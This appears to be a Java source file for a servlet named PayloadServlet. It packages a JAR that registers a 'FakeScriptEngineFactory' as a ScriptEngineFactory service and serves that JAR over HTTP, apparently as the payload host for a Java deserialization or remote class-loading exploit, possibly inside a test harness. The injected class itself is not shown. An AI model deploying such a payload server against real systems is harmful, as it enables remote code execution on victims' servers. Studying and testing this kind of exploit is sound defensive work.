import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.jboss.shrinkwrap.api.ShrinkWrap;
import org.jboss.shrinkwrap.api.exporter.ZipExporter;
import org.jboss.shrinkwrap.api.spec.JavaArchive;

import javax.script.ScriptEngineFactory;
import java.io.IOException;

public class PayloadServlet extends HttpServlet {
    private final JavaArchive archive;

    public PayloadServlet() {
        this.archive = ShrinkWrap.create(JavaArchive.class,"myarchive.jar")
                .addAsManifestResource("services/" + ScriptEngineFactory.class.getName())
                .addClass(FakeScriptEngineFactory.class);
    }
    @Override
    protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException {
        System.err.println(req);
        final String contextPath = req.getContextPath();
        if (contextPath.equals("")) {
            archive.as(ZipExporter.class).exportTo(resp.getOutputStream());
            resp.setStatus(HttpServletResponse.SC_OK);
            return;
        }
        throw new RuntimeException("NYI");
    }
}
